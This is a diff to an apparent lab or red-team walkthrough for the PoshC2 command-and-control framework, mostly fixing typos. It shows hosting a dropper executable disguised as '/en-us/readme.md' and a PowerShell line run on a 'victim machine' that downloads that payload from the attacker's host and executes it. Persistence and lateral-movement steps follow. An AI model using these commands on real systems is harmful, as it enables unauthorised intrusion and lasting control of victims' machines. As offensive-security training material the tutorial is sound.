@@ -19,17 +19,13 @@ Edit the configuration for your project:
 posh-config
 ```
 Edit `payloadcoms` to your ip  
-Also edit Bindport form 443 to 80
+Also edit Bindport from 443 to 80
 
 Launch the Poshc2 server:
 ```
 posh-server
 ```
 
-Alternatively start it as a service:
-```
-posh-service
-```
 Separately, run the ImplantHandler for interacting with implants:
 ```
 posh -u <username>
@@ -52,7 +48,7 @@ add-hosted-file
 
 Host file options 
 ```console
-file location > /var/poshc2/YourProjectName/payloads/Sharp_v4_dropper_x64.exe
+file location > /var/poshc2/<YourProjectName>/payloads/Sharp_v4_dropper_x64.exe
 file uri > /en-us/readme.md
 file MIME type > text/html
 Base64 > n
@@ -67,7 +63,7 @@ show-hosted-files
 
 For testing lets downloading using powershell on victim machine using a basic user
 ```powershell
-iwr -uri http://<YouripOrDomian>/HostedUriString -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
+iwr -uri http://<YouripOrDomian>/en-us/readme.md -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
 ```
 
 Interact with implant by typeing `1` in ImplantHandler
@@ -145,13 +141,15 @@ You should see your scheduled task name appear for confirmation
 
 # Lateral Movement 
 
+**Only if you have more than one victim machine. If you don't, skip to Step 2**
+
 Now lets run a `sharpview` to enumerate the network to conduct lateral movement
 ```
 sharpview 
 ```
 > Read more on sharpview [here](https://academy.hackthebox.com/course/preview/active-directory-powerview/powerviewsharpview-overview--usage)
 
-We can us the enumeration script to identify the next workstation to laterally move to 
+We can use the enumeration script to identify the next workstation to laterally move to 
 
 ```
 resolveip <127.0.0.1>
